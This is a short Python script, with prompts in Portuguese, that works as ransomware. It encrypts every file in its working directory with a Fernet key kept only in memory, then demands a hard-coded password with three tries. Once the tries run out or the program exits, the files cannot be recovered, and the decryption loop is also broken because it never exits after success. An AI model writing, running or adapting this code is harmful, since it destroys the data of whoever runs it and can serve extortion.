import os
from cryptography.fernet import Fernet

files = []

key = Fernet.generate_key()

for file in os.listdir():
    if file == "madara.py" or file == "chave.key" or file == "guy_sensei.py":
        continue
    if os.path.isfile(file):
        files.append(file)

for file in files:
    with open(file, "rb") as arquivo:
        conteudo = arquivo.read()
    conteudo_encrypted = Fernet(key).encrypt(conteudo)
    with open(file, "wb") as arquivo:
        arquivo.write(conteudo_encrypted)


password = input("Mete  a password para descriptografação :")
tentativas = 0
while tentativas < 3:
    if password == "teste12345":
        files = []

        for file in os.listdir():
            if file == "madara.py" or file == "chave.key" or file == "guy_sensei.py":
                continue
            if os.path.isfile(file):
                files.append(file)

        for file in files:
            with open(file, "rb") as arquivo:
                conteudo = arquivo.read()
            conteudo_decrypted = Fernet(key).decrypt(conteudo)
            with open(file, "wb") as arquivo:
                arquivo.write(conteudo_decrypted)

        print("Files decrypted successfully.")
    else:
        tentativas += 1
        print("A password esta incorreta ,tens mais",3-tentativas, "restantes têm cuidado a meter a password")
        password = input("Qual é a passwoard:")
if tentativas == 3:
    print("Você excedeu o número máximo de tentativas. O programa será encerrado.")
